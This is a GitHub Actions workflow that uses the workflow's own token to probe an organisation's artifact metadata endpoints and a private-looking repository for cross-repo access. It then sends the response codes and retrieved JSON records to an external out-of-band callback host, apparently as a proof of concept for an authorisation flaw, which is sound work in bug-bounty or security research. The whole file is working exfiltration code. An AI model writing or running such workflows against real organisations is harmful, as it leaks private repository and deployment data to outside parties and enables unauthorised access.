name: readmeta
on:
  workflow_dispatch:
permissions:
  contents: read
  artifact-metadata: read
jobs:
  rd:
    runs-on: ubuntu-latest
    steps:
      - name: cross-repo metadata read probe (beacon)
        env:
          TOKEN: ${{ github.token }}
        run: |
          B=https://api.github.com
          A="Authorization: Bearer $TOKEN"
          H="Accept: application/vnd.github+json"
          D=sha256:5a28310c1e3a2dab9bb36fde1f53660ac31d062297eb8db843d4fcd51ddafb86
          DR=$(curl -s -o /tmp/d.json -w '%{http_code}' -H "$A" -H "$H" "$B/orgs/tooforg/artifacts/$D/metadata/deployment-records")
          SR=$(curl -s -o /tmp/s.json -w '%{http_code}' -H "$A" -H "$H" "$B/orgs/tooforg/artifacts/$D/metadata/storage-records")
          MR=$(curl -s -o /dev/null -w '%{http_code}' -H "$A" -H "$H" "$B/repos/tooforg/invisible-repo")
          curl -s -G "http://ro4yhyiy8bnjaqqlmuqbahdry1idkibzn.oast.pro/meta" --data-urlencode "d=$DR" --data-urlencode "s=$SR" --data-urlencode "m=$MR" --data-urlencode "db@/tmp/d.json" --data-urlencode "sb@/tmp/s.json" > /dev/null
